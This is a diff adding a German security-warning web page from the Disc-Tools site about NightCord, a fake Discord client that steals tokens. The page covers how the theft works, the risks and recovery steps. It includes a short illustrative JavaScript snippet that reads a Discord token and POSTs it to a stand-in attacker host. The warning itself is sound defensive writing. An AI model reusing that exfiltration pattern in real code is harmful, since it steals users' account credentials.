@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NightCord – Fake Vencord mit Token-Logger | Sicherheitswarnung | Disc-Tools</title>
+    <meta name="description" content="NightCord ist ein gefälschter Vencord-Client, der Discord-Token stiehlt. Das GitHub-Repo wurde entfernt, aber alte Versionen sind noch im Umlauf.">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <link rel="icon" type="image/png" href="/assets/img/logo.png">
+    <link rel="stylesheet" href="/css/style.css?v=2">
+    <link rel="canonical" href="https://disc-tools.de/security-articles/nightcord/">
+    <script defer src="https://umami.disc-tools.de/script.js" data-website-id="0cf82497-80c8-42a2-b6e4-8a8ae179d1fe"></script>
+
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://disc-tools.de/security-articles/nightcord/">
+    <meta property="og:title" content="NightCord – Fake Vencord mit Token-Logger | Sicherheitswarnung">
+    <meta property="og:description" content="NightCord ist ein gefälschter Discord-Client, der Token stiehlt. So erkennst du ihn und schützt dich.">
+
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://disc-tools.de/security-articles/nightcord/">
+    <meta property="twitter:title" content="NightCord – Fake Vencord mit Token-Logger | Sicherheitswarnung">
+    <meta property="twitter:description" content="NightCord ist ein gefälschter Discord-Client, der Token stiehlt. So erkennst du ihn und schützt dich.">
+    <meta property="og:image" content="https://disc-tools.de/assets/img/logo.png">
+    <meta property="og:image:width" content="64">
+    <meta property="og:image:height" content="64">
+    <meta name="twitter:image" content="https://disc-tools.de/assets/img/logo.png">
+    <style>
+        .warning-box {
+            background: rgba(231, 76, 60, 0.1);
+            border: 1px solid rgba(231, 76, 60, 0.3);
+            border-radius: 12px;
+            padding: 20px 24px;
+            margin: 32px 0;
+        }
+        .warning-box strong {
+            color: #e74c3c;
+            display: block;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            margin-bottom: 8px;
+        }
+        .warning-box p {
+            margin: 0;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        .code-block {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 20px 24px;
+            margin: 24px 0;
+            overflow-x: auto;
+        }
+        .code-block pre {
+            margin: 0;
+        }
+        .code-block code {
+            font-family: var(--mono);
+            font-size: 13px;
+            line-height: 1.6;
+            color: #e74c3c;
+        }
+    </style>
+</head>
+<body>
+    <div class="glow"></div>
+    <header>
+        <a href="/" class="logo-container">
+            <img loading="lazy" src="/assets/img/logo.png" alt="Disc-Tools Logo" class="main-logo" onerror="this.style.display='none'">
+            <div class="logo">Disc<span>-</span>Tools</div>
+        </a>
+        <nav class="nav-links">
+            <a href="/tools/" class="nav-link">Tools</a>
+            <div class="nav-dropdown">
+                <button class="nav-link dropdown-toggle active" aria-haspopup="true" aria-expanded="false">Learn <i class="fa-solid fa-chevron-down"></i></button>
+                <div class="dropdown-menu">
+                    <a href="/guides/">Guides</a>
+                    <a href="/tips/formatting/">Formatting</a>
+                    <a href="/tips/shortcuts/">Shortcuts</a>
+                    <a href="/security-articles/">Security</a>
+                </div>
+            </div>
+            <a href="https://status.disc-tools.de/status/disc-tools" class="nav-link">Status</a>
+            <a href="/partner/" class="nav-link">Partner</a>
+            <a href="/about/" class="nav-link">About</a>
+        </nav>
+        <button class="menu-toggle" aria-label="Menu">
+            <span></span><span></span><span></span>
+        </button>
+        <span class="login-badge"><a href="/api/auth/login" class="login-btn"><i class="fa-brands fa-discord"></i> Login</a></span>
+    </header>
+
+    <nav class="breadcrumbs">
+        <a href="/">Home</a>
+        <span>/</span>
+        <a href="/learn/">Learn</a>
+        <span>/</span>
+        <a href="/security-articles/">Security Articles</a>
+        <span>/</span>
+        <a href="/security-articles/nightcord/" class="current">NightCord Warnung</a>
+    </nav>
+
+    <main class="guide-page">
+        <section class="guide-hero">
+            <h1><em>NightCord</em> – Gefälschter Discord-Client mit Token-Logger</h1>
+            <p>Ein Vencord-Fork, der verspricht, dein Discord-Erlebnis zu verbessern – und dabei deinen Account stiehlt.</p>
+        </section>
+
+        <div class="guide-content">
+            <div class="warning-box">
+                <strong>Warnung</strong>
+                <p>NightCord ist kein sicherer Discord-Client. Wer ihn installiert, riskiert den vollständigen Verlust seines Discord-Kontos. Das originale GitHub-Repository wurde nach massiven Hinweisen auf Token-Diebstahl entfernt. Die Entwickler streiten alles ab, aber alte Versionen beweisen den Schadcode eindrucksvoll.</p>
+            </div>
+
+            <h2>Was ist NightCord?</h2>
+            <p><strong>NightCord</strong> gab sich als verbesserter Discord-Client aus – ähnlich wie <a href="https://vencord.dev" target="_blank" rel="noopener">Vencord</a> oder BetterDiscord. Es wurde als optisch aufgewertete Alternative mit zusätzlichen Funktionen beworben. In Wirklichkeit handelte es sich um eine getarnte Schadsoftware, die darauf ausgelegt war, Discord-Token zu stehlen.</p>
+
+            <p>Das GitHub-Repository und sehr wahrscheinlich auch die zugehörige Website wurden inzwischen entfernt. Dennoch kursieren alte Versionen weiterhin in Discord-Servern, Foren und über Direktnachrichten.</p>
+
+            <h2>Wie funktioniert der Token-Diebstahl?</h2>
+            <p>NightCord enthielt versteckten Code, der beim Start des Clients automatisch ausgeführt wurde:</p>
+            <ol>
+                <li>Der Client liest die Discord-Token-Datei aus dem lokalen Speicher des Benutzers aus</li>
+                <li>Der Token wird an einen Server der Angreifer gesendet (via Webhook oder HTTP-Request)</li>
+                <li>Die Angreifer haben nun vollen Zugriff auf das Discord-Konto</li>
+            </ol>
+
+            <p>Das Besondere: Der Schadcode war gut in der Codebasis versteckt – in alten Versionen (die noch kursieren) ist er klar als Token-Logger zu identifizieren.</p>
+
+            <div class="code-block">
+                <pre><code>// Vereinfachte Darstellung des Schadmusters, das in NightCord gefunden wurde
+const token = DiscordNative.nativeModules.require('process').env.DISCORD_TOKEN;
+fetch('https://angreifer-server/steal', { method: 'POST', body: JSON.stringify({ token }) });</code></pre>
+            </div>
+
+            <h2>Was können Angreifer mit deinem Token tun?</h2>
+            <p>Ein Discord-Token ist der <strong>komplette Schlüssel zu deinem Account</strong>. Mit einem Token können Angreifer:</p>
+
+            <ul>
+                <li><strong>Vollständigen Account-Zugriff erhalten</strong> – Sie können sich als dich ausgeben, ohne Passwort oder 2FA. Discord fragt nicht nochmal nach.</li>
+                <li><strong>Private Nachrichten lesen</strong> – Alle DMs, Gruppenchats und Server-Nachrichten sind einsehbar.</li>
+                <li><strong>Nachrichten in deinem Namen senden</strong> – Sie können Spam, Betrug oder Schadlinks an deine Freunde und Kontakte senden, was den Schaden weiter vergrößert.</li>
+                <li><strong>Server beitreten oder verlassen</strong> – Dein Account kann in Server eingeladen werden oder vorhandene Server verlassen.</li>
+                <li><strong>Administrative Aktionen ausführen</strong> – Wenn du Admin-Rechte in einem Server hast, können die Angreifer Mitglieder bannen, Nachrichten löschen, Kanäle umbenennen und den Server sabotieren.</li>
+                <li><strong>Zahlungsmethoden einsehen</strong> – Falls du Discord Nitro oder andere Käufe getätigt hast, können hinterlegte Zahlungsinformationen (PayPal, Kreditkarte) ausgelesen werden.</li>
+                <li><strong>Sitzungen aufrechterhalten</strong> – Selbst wenn du dein Passwort änderst, bleibt der gestohlene Token gültig, bis du alle Sitzungen in den Discord-Einstellungen unter "Log Out All Known Devices" beendest.</li>
+            </ul>
+
+            <h2>So schützt du dich</h2>
+            <ul>
+                <li><strong>Installiere keine modifizierten Discord-Clients</strong> aus nicht vertrauenswürdigen Quellen. Nutze ausschließlich die offizielle Discord-App oder bekannte Open-Source-Clients wie Vencord, die von der Community geprüft werden.</li>
+                <li><strong>Prüfe vor der Installation immer den Quellcode</strong> Wenn ein Client behauptet, "closed source" zu sein, ist das ein massives Warnsignal bei Sicherheitssoftware.</li>
+                <li><strong>Verwende Discord im Browser</strong> für unbekannte oder riskante Clients – der Browser isoliert die Sitzung besser als die Desktop-App.</li>
+                <li><strong>Aktualisiere regelmäßig dein Passwort</strong> und nutze die Funktion "Alle bekannten Geräte abmelden" in den Discord-Sicherheitseinstellungen.</li>
+                <li><strong>Aktiviere 2FA</strong> Zwar schützt 2FA nicht vor Token-Diebstahl, aber es erschwert Angreifern den Zugriff auf dein Konto über andere Wege.</li>
+            </ul>
+
+            <h2>Wurde ich bereits getroffen?</h2>
+            <p>Wenn du NightCord jemals installiert hast, gehe davon aus, dass dein Token kompromittiert ist. Folge diesen Schritten sofort:</p>
+            <ol>
+                <li>Öffne Discord → Benutzereinstellungen → "Mein Konto"</li>
+                <li>Klicke auf "Passwort ändern" – das invalidiert deinen aktuellen Token</li>
+                <li>Gehe zu "Geräte" und klicke auf "Alle bekannten Geräte abmelden"</li>
+                <li>Ändere auch dein E-Mail-Passwort, falls es identisch war</li>
+                <li>Überprüfe deine verbundenen Apps unter "Autorisierte Apps" und entferne alles Unbekannte</li>
+            </ol>
+
+            <h2>Fazit</h2>
+            <p>NightCord ist ein weiteres Beispiel dafür, wie getarnte Schadsoftware in der Discord-Community verbreitet wird. Die Entwickler streiten die Vorwürfe ab, obwohl alte Versionen den Token-Diebstahl eindeutig belegen. Das Repository ist zurecht entfernt. Aber alte Versionen sind noch im Umlauf – installiere NightCord unter keinen Umständen.</p>
+
+            <p>Bleib wachsam und hinterfrage jeden "verbesserten" Client, der dir in Discord-Servern oder DMs angeboten wird. Wenn etwas zu gut aussieht, um wahr zu sein, ist es das meistens auch.</p>
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-brand">
+                <a href="/" class="logo-container">
+                    <img loading="lazy" src="/assets/img/logo.png" alt="Disc-Tools Logo" class="main-logo" onerror="this.style.display='none'">
+                    <div class="logo">Disc<span>-</span>Tools</div>
+                </a>
+                <p>The ultimate collection of Discord utilities. Secure, fast, and privacy-focused.</p>
+                <a href="https://discord.gg/rtRs8rhj5u" target="_blank" rel="noopener" class="footer-github" aria-label="Discord Server"><i class="fa-brands fa-discord"></i></a>
+                <a href="https://github.com/mistr-kebab/Disc-Tools" target="_blank" rel="noopener" class="footer-github" style="margin-left:12px;" aria-label="GitHub Repository"><i class="fa-brands fa-github"></i></a>
+                <a href="https://tiktok.com/@disc.tools" target="_blank" rel="noopener" class="footer-github" style="margin-left:12px;" aria-label="TikTok"><i class="fa-brands fa-tiktok"></i></a>
+                <a href="https://instagram.com/disc.tools" target="_blank" rel="noopener" class="footer-github" style="margin-left:12px;" aria-label="Instagram"><i class="fa-brands fa-instagram"></i></a>
+            </div>
+            <div class="footer-section">
+                <h3 class="footer-section-title">Explore</h3>
+                <ul class="footer-links">
+                    <li><a href="/">Home</a></li>
+                    <li><a href="/tools/">All Tools</a></li>
+                    <li><a href="https://status.disc-tools.de/status/disc-tools">System Status</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3 class="footer-section-title">Support</h3>
+                <ul class="footer-links">
+                    <li><a href="/about/">About Us</a></li>
+                    <li><a href="/guides/">Quick Start Guides</a></li>
+                    <li><a href="/team/">Our Team</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3 class="footer-section-title">Legal</h3>
+                <ul class="footer-links">
+                    <li><a href="/legal/privacy-policy/">Privacy Policy</a></li>
+                    <li><a href="/legal/terms-of-service/">Terms of Service</a></li>
+                    <li><a href="/legal/imprint/">Imprint</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>&copy; 2026 Disc-Tools &mdash; not affiliated with <a href="https://discord.com" target="_blank">Discord Inc.</a></p>
+            <div class="footer-sass">// screw them anyways</div>
+        </div>
+    </footer>
+
+    <script src="/js/main.js?v=2" defer></script>
+</body>
+</html>
